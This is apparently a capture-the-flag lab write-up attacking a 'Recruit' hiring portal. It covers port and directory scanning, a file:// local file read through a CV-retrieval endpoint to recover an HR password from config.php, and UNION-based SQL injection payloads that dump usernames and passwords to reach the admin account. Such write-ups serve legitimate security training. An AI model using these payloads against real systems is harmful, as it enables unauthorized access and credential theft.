
Recruit has just launched its new recuitment portal, allowing HR staff to manage candidate applications and administrators to oversee hiring decisions. While the platform appears functional, management suspects that security may have been overlooked during development. Your task is to assess the application like a real attacker, mapping, its structure, abusing exposed functionality, and exploiting vulnerabilities.

Can you gain an initial foodhold, escalate your access, and ultimately log in as the administrator?

What is the flag value after logging in as a normal user?

What is the flag value after logging in as admin?

---


## Reconnaissance

I used Nmap to scan the target IP address and identify the services running on the host:

```bash
sudo nmap -sSVC -p- -T5 -oN recruit_2026-09-19.nmap 10.128.148.28

Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-19 21:30 +0200
Nmap scan report for 10.128.148.28
Host is up (0.042s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 ec:85:da:99:0c:0e:f1:66:19:bc:79:47:46:fe:33:c4 (RSA)
|   256 45:b5:51:ad:8b:76:a1:6d:af:8d:4b:27:38:aa:28:4e (ECDSA)
|_  256 63:5e:42:37:0b:02:49:b5:6d:64:00:9c:b5:24:d4:bd (ED25519)
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
| dns-nsid:
|_  bind.version: 9.16.1-Ubuntu
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Recruit
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.76 seconds
```

The scan identified theree exposed services:

22 (SSH) OpenSSH 8.2p1 Ubuntu
53 (DNS) ISC BIND 9.16.1
80 (HTTP) Apache 2.4.41

Then I inspected the web application running on port 80

![[Pasted image 20260924210926.png]]

The application presents a simple authentication form using POST, along with a link to an "Access API" page.

![[Pasted image 20260924211152.png]]

The API documentation describes a service that retrieves CV files from the database. This functionality suggested that the endpoint might be vulnerable to SSRF (server-side request forgery) or retrieval.

---


## Enumeration

I continued enumetating the application's directories using ffuf

```bash
ffuf -u http://10.128.148.28:80/FUZZ  -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -t 40

________________________________________________

 :: Method           : GET
 :: URL              : http://10.128.148.28:80/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher           : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

assets           [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 38ms]
.hta             [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3792ms]
.htpasswd        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3814ms]
.htaccess        [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 3822ms]
index.php        [Status: 200, Size: 1417, Words: 283, Lines: 49, Duration: 39ms]
javascript       [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 34ms]
mail             [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 36ms]
phpmyadmin       [Status: 301, Size: 319, Words: 20, Lines: 10, Duration: 36ms]
server-status    [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 41ms]
sitemap.xml      [Status: 200, Size: 1710, Words: 365, Lines: 66, Duration: 39ms]
:: Progress: [4750/4750] :: Job [1/1] :: 1041 req/sec :: Duration: [0:00:08] :: Errors: 0 ::
```

The scan revealed several interesting endpoints and directories, including "mail", "phpmyadmin" and "sitemap.xml"

Inspecting sitemap.xml reveales the following comment:

```text

 Notes:
   - Some directories may contain internal documentation or logs.
   - Certain endpoints are intended for internal HR integrations.
   - Access to sensitive data is role-restricted.
```

While enumerating the available directories, I found the username "hr" and a hint that the user's password was stored in "config.php" I also found information about the administrator's credentials:

```text
As discussed during deployment:
- HR login credentials (username: hr) are currently stored in the application
  configuration file (config.php) for ease of access during
  the initial rollout phase.
- Administrator credentials are NOT stored in the application
  files and are securely maintained within the backend database.
```

---


## Discovering Credentials

Following the API documentation, I attempted to retrieve the config.php file by abusing the file retrieval functionality.

```URL
http://10.128.148.28/file.php?cv=file:///var/www/html/config.php
```

The request returned the contents of "config.php"

```php
/*
|--------------------------------------------------------------------------
| HR Credentials (Temporary – Initial Rollout Phase)
|--------------------------------------------------------------------------
| NOTE:
| These credentials are stored here temporarily for ease of access
| during the initial deployment and will be moved to the database
| in a future release.
*/

$HR_PASSWORD = '<REDACTED>';

/*
|---------------------------
```

---


## Initial Access

I returned to the login page and authenticated using the recovered HR credentials

![[Pasted image 20260924213116.png]]

This gave me the first flag as a normal user, confirming successful initial access

---


## SQL Injection

After obtaining the user flag, I inspected dashboard.php and found a candidate search functionality.

Submitting a single quote (') in the search field triggered a SQL error. The error message identified MySQL as the database system.

![[Pasted image 20260924213854.png]]

I then tested the following input in the search field:
```search form
' OR 1=1; --
```

The error disappeared, suggesting that the input was being interpreted as part of the SQL query.

I then tested for an in-band SQL injection using UNION SELECT.

### Determining the number of columns 

I first determined the number of columns in the original query

```SQL
Bob Smith UNION SELECT 1, 2, 3, 4 ;-- -
```

The query returned successfully with four values, indicating that the original query contained four columns.

### Identifying the database

Next, I retrieved the name of the current database:

```sql
Bob Smith UNION SELECT 1, database(), 3, 4 ;-- -
```
![[Pasted image 20260924214801.png]]

The database name was "recruit_db"

### Enumerating tables

I then enumerated tables in the "recruit_db" database using "information_schema.tables"

```sql
Bob Smith ' UNION SELECT 1, group_concat(table_name), 3, 4
FROM information_schema.tables
WHERE table_schema = 'recruit_db'; -- -
```

![[Pasted image 20260926144418.png]]

The database contained two relevant tables: "candidates" and "users"

### Enumerating Columns

Next, I enumerated the columns of the "users" table:

```sql
Bob Smith ' UNION SELECT 1, group_concat(column_name), 3, 4
FROM information_schema.columns
WHERE table_name = 'users'; -- -
```

![[Pasted image 20260926144746.png]]

The response revealed the following columns:

```response
CURRENT_CONNECTIONS
MAX_SESSION_CONTROLLED_MEMORY
MAX_SESSION_TOTAL_MEMORY
TOTAL_CONNECTIONS
USER
id
password
username
```

### Extracting User Credentials

Finally, I extracted the usernames and passwords from the "users" table:

```sql
Bob Smith ' UNION SELECT 1,
group_concat(username, ':', password SEPARATOR '<br>'),
3, 4
FROM users; -- -
```

![[Pasted image 20260926145131.png]]

The query returned the administrator's credentials

---


## Privilege Escalation

I returned to the login page and authenticated using the recovered administrator credentials.

![[Pasted image 20260926145426.png]]


Successful authentication as admin provided access to the administrator account and reveales the final flag

---


## Summary 

The attack path consisted of several stages:

1. Reconnaissance - identified SSH, DNS and HTTP services
2. Enumeration - discovered application directories and exposed internal ingormation
3. Initial Access - abused the file retrieval functionality to read config.php and recover the HR password
4. SQL Injection - exploited the candidate search functionality using UNON-based SQL injection 
5. Credential Extraction - retrieved the administrator's credentials from the users table
6. Privilege Escalation - authenticated as the administrator and obrained the final flag
